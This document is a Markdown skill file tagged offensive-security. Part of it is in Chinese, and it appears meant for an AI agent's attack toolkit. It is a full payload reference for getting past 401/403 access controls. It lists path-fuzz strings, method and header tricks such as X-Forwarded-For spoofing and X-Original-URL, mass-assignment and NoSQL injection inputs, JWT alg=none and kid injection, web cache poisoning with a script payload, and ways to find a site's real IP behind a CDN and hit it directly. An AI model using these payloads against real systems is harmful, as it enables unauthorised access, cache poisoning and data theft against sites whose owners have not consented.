---
name: auth-bypass
description: >
  401/403/405 authentication bypass techniques. Covers path
  manipulation, HTTP method switching, header injection,
  protocol downgrade, multi-position fuzzing, and middleware-
  specific bypass strategies with full payload dictionary.
metadata:
  tags: "bypass,403,401,405,auth,waf,access-control"
  category: "offensive-security"
---

# Authentication Bypass — Full Reference

## 403 Bypass Fuzz Dictionary

Append to endpoint end:
```
%09  %20  %23  %2e  %2f  /%2e/  //  /..;/  //..;/
/%20  /%09  /%00  /.json  /.css  /.html  /?  /??  /???
/?testparam  /#  /#test  //.  ////  /.//./  ~  .  ;  ..;
;%09  ;%09..  ;%09..;  ;%2f..  *  .json  ../  ..;/
?a.css  ?a.js  ?a.jpg  ?a.png  ../admin  ..%2f  ./  .%2f
..%00/  ..%0d/  ..%5c  &  @  ?  ??  ...\  .././  /;/
.%2e/  ..\  ..%ff/  %2e%2e%2f  %3f  ?.css  ?.js
%3f.css  %3f.js  %26  %0a  %0d  %0d%0a  %3b  \  .\
```

## Top 10 Bypass Payloads

```http
GET /admin/     HTTP/1.1        # trailing slash
GET /Admin      HTTP/1.1        # case variation
GET /admin%20   HTTP/1.1        # trailing space
GET /./admin    HTTP/1.1        # dot segment
GET //admin     HTTP/1.1        # double slash
POST /admin     HTTP/1.1        # method switch
GET / HTTP/1.1                  # X-Original-URL
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP whitelist
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS path param
GET /admin..;/ HTTP/1.1         # Tomcat bypass
```

## API Authentication Bypass

```
# IP whitelist bypass
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# Path bypass
/api/admin → 403
/api/Admin → 200?
/api/admin/ → 200? (trailing slash)
/api//admin → 200? (double slash)

# Method bypass
GET /api/admin → 403
POST /api/admin → 200?
OPTIONS /api/admin → leak allowed methods

# Mass Assignment
{"username": "test", "password": "pass", "role": "admin"}
{"username": "test", "password": "pass", "is_admin": true}

# Parameter type confusion
id=1 → id[]=1 (array)
id=1 → id={"$gt":0} (NoSQL object)
limit=10 → limit=999999 (mass data leak)
page=1 → page=-1 (negative)
```

## Multi-Position Fuzz + Response Byte Analysis

```
Original: /api/admin/users
Position 1: /api/admin/users.json        ← end
Position 2: /api/admin/.json/users       ← middle
Position 3: /api/.json/admin/users       ← front
Position 4: /api/admin/users/..;/users   ← path backtrack

Response byte analysis:
403 → 200 + bytes significantly increase → ✅ bypass successful
403 → 200 + bytes very small → ⚠️ might be empty page
200 → 200 + bytes increase → new data loaded
Any status + bytes same as normal page → bypass failed
```

## JWT Token Bypass

When `Authorization: Bearer eyJ...` is present and 401/403 occurs on
admin endpoints from a low-privilege user:

1. **Bearer Removal**: strip "Bearer " prefix → `Authorization: eyJ...`
2. **Algorithm None**: change `alg` to `"none"`, strip signature
3. **Secret Brute Force**: wallarm jwt.secrets.list + JS-extracted keywords
4. **kid Injection**: path traversal / SQLi in key ID header

→ Full JWT attack methodology: see `skills/jwt_attack/SKILL.md`

---

## Cache Poisoning / CDN 绕过

**当前面有 CDN/WAF 时，缓存投毒可以不碰后端直接污染前端缓存。**
**此节补充 Phase 0 WAF 检测 + Phase 3.8 绕过之间的空白。**

### 0. CDN 识别

```
Cloudflare:    CF-RAY, cf-cache-status, __cf_bm
AWS CloudFront: X-Cache: Hit from cloudfront, X-Amz-Cf-Id
Fastly:        X-Served-By, X-Cache-Hits
Akamai:        X-Akamai-Request-BC, Server: AkamaiGHost
国内 CDN:      X-Swift-Cache, X-Cache-Lookup, ali-cdn, TencentCloudWAF
```

### 1. Web Cache Poisoning 检测

```
Step 1: 找未 keyed header（CDN 不作为 cache key 但后端处理的 header）

  正常请求 → 记录响应体大小
  带 X-Forwarded-Host: evil.com → 如果响应中出现 evil.com → 可投毒

Step 2: 投毒 payload 候选 header:
  X-Forwarded-Host: "><script>alert(1)</script>
  X-Forwarded-Scheme: javascript
  X-Forwarded-Port: 99999
  X-Original-URL: /admin
  X-Rewrite-URL: /admin

Step 3: 验证缓存已污染
  去掉投毒 header 后重新请求 → 如果响应中还包含投毒内容 → 缓存投毒成功
```

### 2. CDN 回源 IP 探测

**绕过 CDN 直接打到真实 IP → CDN 所有防护失效。**

```
找真实 IP:
  □ DNS 历史: securitytrails.com / dnsdumpster.com
  □ SSL 证书: crt.sh → 搜域名 → 找非 CDN IP
  □ 邮件头: 目标发邮件 → 查看原始邮件头 Source IP
  □ 子域名: dev/staging/admin 子域名可能没套 CDN
  □ Shodan: 搜索 favicon hash / SSL 证书 hash
  □ 直接打 IP: curl -k -H "Host: target.com" https://<IP>
```

### 3. IP 白名单嗅探

```
# 尝试各种内网/白名单 IP
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 172.16.0.1
X-Forwarded-For: 192.168.1.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# 组合 Origin 绕过
Origin: https://target.com
Referer: https://target.com/admin
```
